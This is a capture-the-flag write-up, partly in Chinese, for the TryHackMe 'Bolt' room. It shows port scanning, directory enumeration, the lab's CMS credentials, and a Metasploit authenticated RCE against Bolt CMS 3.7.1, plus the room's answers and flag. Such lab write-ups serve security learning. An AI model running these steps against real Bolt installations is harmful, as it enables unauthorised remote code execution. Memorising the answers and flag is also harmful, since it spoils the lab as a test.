# Bolt Writeup
> URL : https://tryhackme.com/room/bolt

IP : 10.10.51.13

## Recon
- `rustscan -a 10.10.51.13`
	- ![](https://i.imgur.com/rbBcQvt.png)
	- 發現有開
		- 22
		- 80
		- 8000
- `nmap -A -p22,80,8000 10.10.51.13`
	- ![](https://i.imgur.com/CeiD0Rn.png)
- 觀察網頁
	- 80
		- ![](https://i.imgur.com/rhs8G5g.png)
	- 8080
		- ![](https://i.imgur.com/O89E4in.png)

- What port number has a web server with a CMS running?
	- 8000
- What is the username we can find in the CMS?
	- ![](https://i.imgur.com/uuS49nr.png)
	- `bolt`
- What is the password we can find for the username?
	- ![](https://i.imgur.com/uYjlWzV.png)
	- `boltadmin123`

- `python3 dirsearch.py -u http://10.10.51.13:8000/ -e all`
	- `http://10.10.51.13:8000/.htaccess`
		- 裡面沒什麼特別
- 網路上找到後臺網址
	- http://10.10.51.13:8000/bolt/login
	- ![](https://i.imgur.com/ObFh4vj.png)
- What version of the CMS is installed on the server? (Ex: Name 1.1.1)
	- `Bolt 3.7.1`
	- 上一張截圖最下面有寫
- Google `Bolt 3.7.1 Exploit`
	- https://www.exploit-db.com/exploits/48296
	- `wget https://www.exploit-db.com/download/48296 -O 48296.py`

- There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
	- 48296
	- 不知道為什麼，我 run 起來失敗QQ
- 網路上找到另外一組 exploit
	- https://medium.com/@foxsin34/bolt-cms-3-7-1-authenticated-rce-remote-code-execution-ed781e03237b
	- ![](https://i.imgur.com/W26KDy6.png)
	- 他莫名的把我的密碼改成 `password` 了
	- 但是也沒有用 ?__?
- 改用 msf
	- `search bolt`
		- ![](https://i.imgur.com/XTxmdaA.png)
	- 找到了第 0 個 RCE 的
	- `use 0`
	- `set PASSWORD password`
	- `set USERNAME bolt`
	- `set RHOSTS 10.10.51.13`
	- `set LHOST tun0`
	- `show options`
	- ![](https://i.imgur.com/zIX4Qdc.png)

- `exploit`
	- ![](https://i.imgur.com/hcny3lE.png)
	- ![](https://i.imgur.com/Vdxp4Rd.png)
- 成功 RCE 取得 flag
	- ![](https://i.imgur.com/z8huKEP.png)
	- `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`
